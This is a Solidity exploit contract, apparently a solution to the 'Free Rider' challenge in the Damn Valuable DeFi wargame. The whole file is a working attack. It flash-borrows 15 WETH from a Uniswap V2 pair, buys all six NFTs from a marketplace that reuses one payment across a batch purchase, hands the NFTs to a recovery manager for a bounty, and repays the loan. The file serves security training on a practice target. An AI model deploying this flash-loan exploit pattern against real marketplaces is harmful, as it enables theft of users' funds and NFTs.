pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IERC721Custom {
    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) external;
}

contract FRAttack is IUniswapV2Callee, IERC721Receiver {

    IUniswapV2Pair pair;
    FreeRiderNFTMarketplace place;
    WETH weth;
    address public nft;
    FreeRiderRecoveryManager recoveryManager;

    constructor(IUniswapV2Pair univ2pair, FreeRiderNFTMarketplace marketplace, WETH weth1, DamnValuableNFT nft1, FreeRiderRecoveryManager manager) {
        pair = univ2pair;
        place = marketplace;
        weth = weth1;
        nft = address(nft1);
        recoveryManager = manager;
    }

    function attack() external {
        // Flash borrow 15 WETH from UniswapV2Pair
        pair.swap(15 ether, 0, address(this), "1"); // // Flash swap triggered when data.length > 0
    }

    // UniswapV2Pair flash swap callback function
    function uniswapV2Call(address sender, 
        uint amount0, 
        uint amount1, 
        bytes calldata data
    ) external override {
        // Unwrap the borrowed 15 WETH into native ETH
        uint256 weth_balance = weth.balanceOf(address(this));
        weth.withdraw(weth_balance);

        // Purchase all 6 NFTs
        uint256[] memory tokenIds = new uint256[](6);
        for(uint256 i = 0; i < 6; i++){
            tokenIds[i] = i;
        }
        place.buyMany{value: 15 ether}(tokenIds); 

        // Transfer all NFTs to recoveryManager contract and send 45 ETH bounty to player account
        for(uint256 tokenId = 0; tokenId < tokenIds.length; tokenId++){
            IERC721Custom(nft).safeTransferFrom(address(this), address(recoveryManager), tokenId, abi.encode(tx.origin));
        }
        
        // Calculate loan repayment amount considering the 0.3% fee
        uint amountToRepay = (amount0 * 1000) / 997 + 1;

        // Wrap native ETH back into WETH and repay loan
        weth.deposit{value: amountToRepay}();
        weth.transfer(address(pair), amountToRepay);

    }

    // Must implement this function to pass safeTransferFrom validation
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        // Return function's own selector (i.e., bytes4(keccak256("onERC721Received(address,address,uint256,bytes)")))
        return this.onERC721Received.selector;
    }

    receive() external payable{}

}